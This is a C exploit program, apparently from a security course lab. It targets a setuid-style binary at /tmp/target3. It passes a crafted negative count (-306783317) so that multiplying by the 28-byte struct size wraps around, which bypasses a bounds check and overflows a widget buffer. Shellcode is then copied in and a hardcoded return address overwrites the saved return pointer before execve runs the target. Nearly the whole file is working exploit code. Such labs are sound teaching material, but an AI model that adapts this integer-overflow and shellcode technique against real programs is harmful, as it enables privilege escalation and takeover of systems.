#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"


int main(void)
{

  char *args[3];
  char *env[1];
  int i;
  // int negative_overflow = -306783317;

  args[0] = TARGET;

  /* buffer must be large enough to overflow into buf into esp
  the size of struct widget_t buf[MAX_WIDGETS] is 1680 (60*28) */
  char buff[1716]; 

  // fill buffer with non-null characters
  memset (buff, 1, sizeof buff);

  // -306783317 * 28 (size of struct) = 1716
  strcpy (buff, "-306783317,");

  // fill buffer past string integer and comma with shellcode
  for(i = 11; i < strlen(shellcode) + 11; ++i)
    buff[i] = shellcode[i-11];
  
  // address of beginning of shellcode placed at end of buff where it will overflow in buff
  *(long*)(buff + 1695) = 0xbffff118;

  args[1] = buff;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  /* testing multiplication overflow values*/
  // int k;
  // int j = 0;
  // int x;
  // for (k = -306783999; j < 1000 ; ++j)
  // {
  // 	  x = k * 28;
  //     printf("product of %d and 28 is: %d\n",k, x);
  //     ++k;
  // }


  return 0;
}
